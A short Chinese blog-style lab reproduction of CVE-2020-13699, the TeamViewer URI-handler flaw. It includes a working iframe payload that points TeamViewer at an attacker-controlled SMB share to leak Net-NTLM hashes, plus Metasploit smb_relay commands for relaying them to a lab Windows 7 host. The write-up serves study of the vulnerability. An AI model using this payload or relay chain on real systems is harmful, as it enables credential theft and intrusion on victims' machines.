**1.CVE-2020-13699**

* * *

  

这个漏洞的原理真的非常傻逼,真的非常非常的傻逼，这玩意都能拿CVE。。。。

  

* * *

**1.用户通过IE浏览插了恶意iframe的网页**

**2.弹出对话框**

**3.****点击确认后**呼出teamview****

**4.通过UNC path 触发SMB自认证**

**5.攻击者获取到NET-NTLMhash**

**6.根据已知场景一定几率触发rce  
**

  

****2.复现****

* * *

  

*   
*   
*   
*   

```
teamview V12.1.6290（躺枪的teamview）Windows 7（受害机-192.168.2.138）即SMB HOSTkali(攻击机-192.168.2.136)windows 10(192.168.2.X受害者，发起方，受害者和受害机非同一台)
```

  

安装完成后，新建一个a.html文件。

*   
*   
*   

```
<HTML ><iframe src='teamviewer10: --play \\192.168.2.136\share\fake.tvs'></HTML>
```

通过IE打开（只能通过IE打开，后面会告诉你为啥），然后会弹出teamview的对话框点击确认后，系统就会通过自身hash对ifram中的IP进行认证。这里的攻击场景有两种，一个中继，一个爆破。

  

**2.1SMB RELY**

* * *

  

这边直接用windows7是因为方便，用Windows10还要绕defender，防火墙啥的  

首先理清关系：

*   
*   
*   
*   
*   

```
受害者机器和受害机器不是同一台机器smb host为被攻击机（Windows 7）kali为中继，发起方机器（即win10）未被攻击win 10浏览网页触发SMB自认证，SMB中继攻击，拿着WIN 10的凭证登录windows7（前提：windows10的当前账户与windows7的超级管理员账户密码一致）
```

*   
*   
*   
*   

```
msfconsoleuse exploit/windows/smb/smb_relay set smbhost 192.168.2.138run
```
